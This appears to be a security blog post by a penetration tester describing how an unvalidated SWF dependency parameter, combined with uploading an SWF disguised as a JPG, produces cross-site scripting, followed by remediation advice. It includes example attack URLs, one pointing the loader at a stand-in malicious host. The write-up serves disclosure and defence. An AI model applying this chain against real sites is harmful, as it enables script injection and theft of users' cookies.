<div>
<div dir="ltr">
<div id="x_divtagdefaultwrapper" dir="ltr" style="font-size:12pt; color:#000000; font-family:Calibri,Arial,Helvetica,sans-serif">
<p></p>
<p style="margin-right:0px; margin-bottom:3.2rem; margin-left:0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Serif Pro&quot;,serif; line-height:32px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
Jakub Kaluzny

Recently I have been pentesting a web application, which utilised one of popular SWF libraries. It turned out that few really low risk issues can result in a tricky XSS when combined together. The attack wouldn't be normally possible due to Same Origin Policy guaranteed by Adobe Flash but in specific circumstances it is possible to abuse it.</p>
<h3 style="margin:2.4rem 0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Sans Pro&quot;,Helvetica,Arial,sans-serif; line-height:28px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
The Loader.load() problem</h3>
<p style="margin-right:0px; margin-bottom:3.2rem; margin-left:0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Serif Pro&quot;,serif; line-height:32px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
Some SWF libraries need to import more SWF libraries. Some of them do it dynamically by providing a path to the library, which is not really the best practice but it is not that bad thanks to SOP. Most of the libraries use standard Loader.load() method, which accepts multiple mime types as parameter. You can load JPG file and you can load SWF file as well. SWF file does not need to be a movie, it can be ActionScript executable code. Let's suppose our target website has a following flash embedded:</p>
<p style="margin:3.2rem 0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Serif Pro&quot;,serif; line-height:32px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
http://target/lib.swf?dependency=lib2.swf</p>
<p style="margin:3.2rem 0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Serif Pro&quot;,serif; line-height:32px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
And it loads the dependency using a standard ActionScript mechanism:</p>
<p style="margin:3.2rem 0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Serif Pro&quot;,serif; line-height:32px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
<em style="margin:0px; padding:0px; border:0px; outline:0px; font-size:0.975em; vertical-align:baseline; background:0px 0px; font-family:Georgia,&quot;Source Serif Pro&quot;,serif"><span style="margin:0px; padding:0px; border:0px; outline:0px; font-size:20.475px; vertical-align:baseline; background:0px 0px; font-weight:700">loader:Loader</span> = new Loader()&nbsp;; <span style="margin:0px; padding:0px; border:0px; outline:0px; font-size:20.475px; vertical-align:baseline; background:0px 0px; font-weight:700">loader.load</span>(dependency);&nbsp;addChild(loader);</em></p>
<p style="margin:3.2rem 0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Serif Pro&quot;,serif; line-height:32px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
If there is no validation on <em style="margin:0px; padding:0px; border:0px; outline:0px; font-size:0.975em; vertical-align:baseline; background:0px 0px; font-family:Georgia,&quot;Source Serif Pro&quot;,serif">dependency </em>parameter, the attacker may try to craft the following URL:</p>
<p style="margin:3.2rem 0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Serif Pro&quot;,serif; line-height:32px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
http://<span style="margin:0px; padding:0px; border:0px; outline:0px; vertical-align:baseline; background:0px 0px; font-weight:700">targ.et</span>/lib.swf?dependency=http://<span style="margin:0px; padding:0px; border:0px; outline:0px; vertical-align:baseline; background:0px 0px; font-weight:700">malicious</span>/exploit.swf</p>
<p style="margin:3.2rem 0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Serif Pro&quot;,serif; line-height:32px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
What will happen? If the exploit.swf is a simple movie file (no AS, just image/video), we just found a Cross-Site-Flashing (XSF) vulnerability, which could only result in reputation loss risk (e.g. displaying arbitrary movie content on the target website, maybe some phishing).</p>
<p style="margin:3.2rem 0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Serif Pro&quot;,serif; line-height:32px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
What will happen if exploit.swf contains some ActionScript code which tries to access cookies? <span style="margin:0px; padding:0px; border:0px; outline:0px; vertical-align:baseline; background:0px 0px; font-weight:700">Simply it won't succeed - Same Origin Policy mechanism will stop the browser from executing the code. </span></p>
<h3 style="margin:2.4rem 0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Sans Pro&quot;,Helvetica,Arial,sans-serif; line-height:28px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
Let's combine it with file upload vulnerabilities</h3>
<p style="margin-right:0px; margin-bottom:3.2rem; margin-left:0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Serif Pro&quot;,serif; line-height:32px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
If we were able to upload arbitrary SWF file to the target server, we would be able to access user cookies anyways, which has nothing to do with Loader design principles. But what if we are able to upload an arbitrary JPG file to the server with the contents of SWF exploit?</p>
<p style="margin:3.2rem 0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Serif Pro&quot;,serif; line-height:32px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
http://target/upload/malicious.jpg - does not pose a threat itself, as it is transferred with JPEG mime type, as an image.</p>
<p style="margin:3.2rem 0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Serif Pro&quot;,serif; line-height:32px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
But now, opening the following URL</p>
<p style="margin:3.2rem 0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Serif Pro&quot;,serif; line-height:32px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
http://target/lib.swf?dependency=upload/malicious.jpg allows to execute arbitrary JS code in the target context - basically, Cross-Site Scripting (XSS).</p>
<h3 style="margin:2.4rem 0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Sans Pro&quot;,Helvetica,Arial,sans-serif; line-height:28px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
Remediation</h3>
<p style="margin-right:0px; margin-bottom:3.2rem; margin-left:0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Serif Pro&quot;,serif; line-height:32px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
Basically, breaking the attack chain requires at least one of the following:</p>
<ul style="margin:3.2rem 0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; font-family:&quot;Source Serif Pro&quot;,serif; line-height:32px; white-space:pre-wrap">
<li style="margin:2.4rem 0px 2.4rem 3.2rem; padding:0px; border:0px; outline:0px; vertical-align:baseline; background:0px 0px; list-style-type:inherit">
[end-client] patching web application to not allow uploading arbitrary SWF files with other (JPG) extensions</li><li style="margin:2.4rem 0px 2.4rem 3.2rem; padding:0px; border:0px; outline:0px; vertical-align:baseline; background:0px 0px; list-style-type:inherit">
[end-client] introducing restrictions on parameters to lib.swf (web server level)</li><li style="margin:2.4rem 0px 2.4rem 3.2rem; padding:0px; border:0px; outline:0px; vertical-align:baseline; background:0px 0px; list-style-type:inherit">
[SWF library vendor] restricting loading external SWF files in SWF library</li><li style="margin:2.4rem 0px 2.4rem 3.2rem; padding:0px; border:0px; outline:0px; vertical-align:baseline; background:0px 0px; list-style-type:inherit">
[SWF library vendor] restricting loading files with extension other than SWF</li><li style="margin:2.4rem 0px 2.4rem 3.2rem; padding:0px; border:0px; outline:0px; vertical-align:baseline; background:0px 0px; list-style-type:inherit">
[Adobe] do not allow importing ActionScript SWFs with extension other than .swf</li><li style="margin:2.4rem 0px 2.4rem 3.2rem; padding:0px; border:0px; outline:0px; vertical-align:baseline; background:0px 0px; list-style-type:inherit">
[Adobe] Automatically set LoaderContext.allowCodeImport = false on non-SWF files</li></ul>
<p style="margin:3.2rem 0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Serif Pro&quot;,serif; line-height:32px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
Adobe does not recognise this issue as a vulnerability, as there are ways mentioned in docs to mitigate it (e.g. setting LoaderContext.allowCodeImport = false). However, this setting is more like security opt-in, not following "secure by design" principle.</p>
<h3 style="margin:2.4rem 0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Sans Pro&quot;,Helvetica,Arial,sans-serif; line-height:28px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
Summary</h3>
<p style="margin-right:0px; margin-bottom:3.2rem; margin-left:0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Serif Pro&quot;,serif; line-height:32px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
If you find:</p>
<ul style="margin:3.2rem 0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; font-family:&quot;Source Serif Pro&quot;,serif; line-height:32px; white-space:pre-wrap">
<li style="margin:2.4rem 0px 2.4rem 3.2rem; padding:0px; border:0px; outline:0px; vertical-align:baseline; background:0px 0px; list-style-type:inherit">
SWF library vulnerable to XSF (or actually - same-site flashing)</li></ul>
<p style="margin:3.2rem 0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Serif Pro&quot;,serif; line-height:32px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
and</p>
<ul style="margin:3.2rem 0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; font-family:&quot;Source Serif Pro&quot;,serif; line-height:32px; white-space:pre-wrap">
<li style="margin:2.4rem 0px 2.4rem 3.2rem; padding:0px; border:0px; outline:0px; vertical-align:baseline; background:0px 0px; list-style-type:inherit">
you can upload SWF files with JPG extension on the server</li></ul>
<p style="margin:3.2rem 0px; padding:0px; border:0px; outline:0px; font-size:21px; vertical-align:baseline; background:0px 0px; font-family:&quot;Source Serif Pro&quot;,serif; line-height:32px; counter-reset:list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; white-space:pre-wrap">
It is most likely vulnerable to XSS.</p>
<br>
